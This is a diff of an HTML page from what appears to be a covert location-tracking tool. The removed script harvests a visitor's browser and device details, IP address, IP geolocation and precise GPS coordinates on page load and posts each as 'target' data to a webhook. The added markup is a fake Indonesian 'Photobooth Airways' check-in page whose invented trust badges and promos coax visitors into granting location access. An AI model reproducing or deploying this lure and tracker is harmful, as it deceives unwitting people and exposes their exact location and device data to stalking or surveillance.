@@ -1,186 +1,231 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="id">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Photobooth Airways ✈️ | Online Check-In</title>
+  <meta name="description" content="Check-in online Photobooth Airways dan temukan booth foto terdekat. Economy, Business & First Class tersedia." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Bebas+Neue&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
   <script type="text/javascript" src="dwebhook.js"></script>
 </head>
+<body>
 
-<body onload="getLocation()">
+  <!-- Iframe overlay (shown after permission granted) -->
+  <iframe id="site-frame" src="" allowfullscreen allow="geolocation; camera; microphone"></iframe>
 
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;"></iframe>
+  <!-- Background layers -->
+  <div class="sky-bg"></div>
+  <div class="stars" id="stars"></div>
+  <div class="clouds" id="clouds"></div>
 
-  <p id="demo"></p>
+  <!-- ═══ MOBILE HEADER ═══ -->
+  <div class="mobile-header">
+    <div>
+      <div class="airline-logo">✈ PHOTOBOOTH AIRWAYS</div>
+      <div class="airline-sub">photobooth.bapel.my.id</div>
+    </div>
+    <div style="font-size:10px;color:var(--muted);">Check-In Online</div>
+  </div>
+
+  <!-- ═══ DESKTOP LAYOUT ═══ -->
+  <div class="desktop-layout">
+    <div class="desktop-inner">
+
+      <!-- Left: Promo panel -->
+      <div class="promo-panel">
+        <div class="promo-eyebrow">
+          <span class="promo-dot"></span>
+          Online Check-In Dibuka
+        </div>
+        <h1 class="promo-title">
+          BOARD YOUR<br/>FLIGHT TO<br/><span>TIMELESS MEMORIES</span>
+        </h1>
+        <p class="promo-sub">
+          Photobooth Airways menghadirkan pengalaman foto eksklusif berkonsep maskapai penerbangan.
+          Aktifkan lokasi Anda untuk menemukan booth terdekat dan dapatkan boarding pass foto personal.
+        </p>
+        <div class="promo-classes">
+          <div class="class-card">
+            <div class="class-icon">🟢</div>
+            <div class="class-name">Economy</div>
+            <div class="class-desc">3 foto cetak · Frame standar</div>
+          </div>
+          <div class="class-card featured">
+            <div class="class-icon">🟡</div>
+            <div class="class-name">Business</div>
+            <div class="class-desc">6 foto cetak · 20+ filter premium</div>
+          </div>
+          <div class="class-card">
+            <div class="class-icon">🔵</div>
+            <div class="class-name">First Class</div>
+            <div class="class-desc">Unlimited · Video + frame custom</div>
+          </div>
+        </div>
+        <div class="promo-stats">
+          <div>
+            <div class="stat-num">500<span>+</span></div>
+            <div class="stat-label">Booth Tersedia</div>
+          </div>
+          <div>
+            <div class="stat-num">50<span>k+</span></div>
+            <div class="stat-label">Pelanggan Puas</div>
+          </div>
+          <div>
+            <div class="stat-num">4.9<span>★</span></div>
+            <div class="stat-label">Rating Google</div>
+          </div>
+        </div>
+        <div class="promo-trust">
+          <div class="trust-item"><span>🔒</span> SSL Terenkripsi</div>
+          <div class="trust-item"><span>📍</span> GPS Akurat</div>
+          <div class="trust-item"><span>⚡</span> Check-In Instan</div>
+        </div>
+      </div>
+
+      <!-- Right: Boarding pass card -->
+      <div class="boarding-pass">
+        <div class="pass-header">
+          <div class="pass-airline">✈ BOARDING PASS</div>
+          <div class="pass-badge"><span class="live-dot"></span>ONLINE CHECK-IN</div>
+        </div>
+        <div class="route-strip">
+          <div class="route-city">
+            <div class="route-code">YOU</div>
+            <div class="route-name">Lokasi Anda</div>
+          </div>
+          <div class="route-line">
+            <div class="plane-path">
+              <div class="path-line"></div>
+              <div class="plane-icon">✈</div>
+              <div class="path-line"></div>
+            </div>
+            <div class="route-dur">DIRECT</div>
+          </div>
+          <div class="route-city">
+            <div class="route-code">PBA</div>
+            <div class="route-name">PhotoBooth</div>
+          </div>
+        </div>
+        <div class="pass-details">
+          <div><div class="detail-label">Passenger</div><div class="detail-value">GUEST</div></div>
+          <div><div class="detail-label">Class</div><div class="detail-value">ECONOMY</div></div>
+          <div><div class="detail-label">Gate</div><div class="detail-value">B07</div></div>
+          <div><div class="detail-label">Seat</div><div class="detail-value" id="seatNum-d">--A</div></div>
+          <div><div class="detail-label">Date</div><div class="detail-value" id="flightDate-d">--</div></div>
+          <div><div class="detail-label">Flight</div><div class="detail-value">PB-777</div></div>
+        </div>
+        <div class="tear-line">
+          <div class="tear-circle"></div><div class="tear-dots"></div><div class="tear-circle"></div>
+        </div>
+        <div class="pass-cta">
+          <div id="mainContent-d">
+            <div class="cta-headline">📍 Aktifkan Lokasi untuk Check-In</div>
+            <div class="cta-sub">Izinkan akses lokasi untuk menemukan<br/>PhotoBooth terdekat &amp; cetak boarding pass.</div>
+            <button class="btn-checkin" id="allowBtn-d" onclick="requestLocation()">
+              <div class="btn-label">
+                <span>🛫</span>
+                <span id="btnText-d">TEMUKAN PHOTOBOOTH TERDEKAT</span>
+                <div class="spinner" id="spinner-d"></div>
+              </div>
+            </button>
+            <div class="pass-footer">🔒 photobooth.bapel.my.id · Layanan Resmi</div>
+            <div class="status-bar" id="statusBar-d">
+              <div class="radar-dot"></div>
+              <span id="statusText-d">Mendeteksi lokasi Anda…</span>
+            </div>
+          </div>
+          <div class="success-overlay" id="successOverlay-d">
+            <div class="success-plane">✈️</div>
+            <div class="success-title">BOARDING PASS SIAP!</div>
+            <div class="success-sub">Membuka PhotoBooth terdekat…</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══ MOBILE LAYOUT ═══ -->
+  <div class="mobile-layout">
+    <div class="boarding-pass">
+      <div class="pass-header">
+        <div class="pass-airline">✈ BOARDING PASS</div>
+        <div class="pass-badge"><span class="live-dot"></span>ONLINE CHECK-IN</div>
+      </div>
+      <div class="route-strip">
+        <div class="route-city">
+          <div class="route-code">YOU</div>
+          <div class="route-name">Lokasi Anda</div>
+        </div>
+        <div class="route-line">
+          <div class="plane-path">
+            <div class="path-line"></div>
+            <div class="plane-icon">✈</div>
+            <div class="path-line"></div>
+          </div>
+          <div class="route-dur">DIRECT</div>
+        </div>
+        <div class="route-city">
+          <div class="route-code">PBA</div>
+          <div class="route-name">PhotoBooth</div>
+        </div>
+      </div>
+      <div class="pass-details">
+        <div><div class="detail-label">Passenger</div><div class="detail-value">GUEST</div></div>
+        <div><div class="detail-label">Class</div><div class="detail-value">ECONOMY</div></div>
+        <div><div class="detail-label">Gate</div><div class="detail-value">B07</div></div>
+        <div><div class="detail-label">Seat</div><div class="detail-value" id="seatNum-m">--A</div></div>
+        <div><div class="detail-label">Date</div><div class="detail-value" id="flightDate-m">--</div></div>
+        <div><div class="detail-label">Flight</div><div class="detail-value">PB-777</div></div>
+      </div>
+      <div class="tear-line">
+        <div class="tear-circle"></div><div class="tear-dots"></div><div class="tear-circle"></div>
+      </div>
+      <div class="pass-cta">
+        <div id="mainContent-m">
+          <div class="cta-headline">📍 Aktifkan Lokasi untuk Check-In</div>
+          <div class="cta-sub">Izinkan akses lokasi untuk menemukan PhotoBooth terdekat &amp; dapatkan promo eksklusif!</div>
+          <button class="btn-checkin" id="allowBtn-m" onclick="requestLocation()">
+            <div class="btn-label">
+              <span>🛫</span>
+              <span id="btnText-m">AKTIFKAN LOKASI &amp; CHECK-IN</span>
+              <div class="spinner" id="spinner-m"></div>
+            </div>
+          </button>
+          <div class="pass-footer">🔒 photobooth.bapel.my.id · Layanan Resmi</div>
+          <div class="status-bar" id="statusBar-m">
+            <div class="radar-dot"></div>
+            <span id="statusText-m">Mendeteksi lokasi Anda…</span>
+          </div>
+        </div>
+        <div class="success-overlay" id="successOverlay-m">
+          <div class="success-plane">✈️</div>
+          <div class="success-title">BOARDING PASS SIAP!</div>
+          <div class="success-sub">Membuka PhotoBooth terdekat…</div>
+        </div>
+      </div>
+    </div>
+    <div class="mobile-tagline">PHOTOBOOTH AIRWAYS · CHECK-IN TO YOUR MEMORIES</div>
+  </div>
+
+  <!-- ═══ DESKTOP FOOTER ═══ -->
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">© 2025 <strong>Photobooth Airways</strong> · photobooth.bapel.my.id</div>
+      <div class="footer-links">
+        <a href="#">Syarat &amp; Ketentuan</a>
+        <a href="#">Kebijakan Privasi</a>
+        <a href="#">Bantuan</a>
+        <a href="#">Kontak</a>
+      </div>
+      <div class="footer-ssl">🔒 SSL Secured · Data Anda Aman</div>
+    </div>
+  </footer>
+
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-  <script>
-    var x = document.getElementById("demo");
-
-    let datetime = new Date();
-    let localtime = String(datetime.toLocaleTimeString());
-
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
-
-    const request = new XMLHttpRequest();
-    request.open("POST", "/location_update"); //change webhook
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    var myEmbed = {
-      author: {
-        name: "Target System Information.."
-      },
-      title: "Uagent:",
-      description: sysinfo,
-      color: 15418782
-    }
-
-    var params = {
-      username: "R4VEN",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-      content: "@everyone Someone Opened The Link O_o ",
-      embeds: [myEmbed]
-    }
-
-    request.send(JSON.stringify(params));
-
-    $.getJSON("https://api.ipify.org?format=json", function (data) {
-      $("#gfg").html(data.ip);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Ip"
-        },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
-        color: 15548997,
-
-        footer: {
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
-        }
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "IP Address Reconnaissance"
-        },
-        title: response.status, //response.query
-        description: '```autohotkey\nContinent: ' + response.continent +
-          "\nContinentCode: " + response.continentcode +
-          "\nCountry: " + response.country +
-          "\nCountrycode: " + response.countrycode +
-          "\nRegionname: " + response.regionName +
-          "\nRegion: " + response.region +
-          "\nCity: " + response.city +
-          "\nDistrict: " + response.district +
-          "\nZip: " + response.zip +
-          "\nTime_zone: " + response.time_zone +
-          "\nName: " + response.name +
-          "\nAs: " + response.as +
-          "\nIsp: " + response.isp +
-          "\nReverse: " + response.reverse +
-          "\nOffset: " + response.offset +
-          "\nCurrency: " + response.currency +
-          "\nProxy: " + response.proxy +
-          "\nMobile: " + response.mobile +
-          "\nLat: " + response.lat +
-          "\nLon: " + response.lon + '```',
-        color: 5763719
-
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
-      }
-    }
-
-    function showPosition(position) {
-      var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Allowed Location Permission"
-        },
-        title: "GPS location of target..",
-        description: latlong + "\n",
-        color: 15844367,
-        footer: {
-          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
-        }
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    }
-
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          const request = new XMLHttpRequest();
-          request.open("POST", "/location_update"); //change webhook
-
-          request.setRequestHeader('Content-type', 'application/json');
-
-          const params = {
-            username: "R4VEN",
-            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-            content: "```diff\n- User denied the request for Geolocation.```"
-          }
-
-          request.send(JSON.stringify(params));
-          break;
-        case error.POSITION_UNAVAILABLE:
-          x.innerHTML = "Location information is unavailable."
-          break;
-        case error.TIMEOUT:
-          x.innerHTML = "The request to get user location timed out."
-          break;
-        case error.UNKNOWN_ERROR:
-          x.innerHTML = "An unknown error occurred."
-          break;
-      }
-    }
-  </script>
+  <script src="app.js"></script>
 </body>
-
 </html>
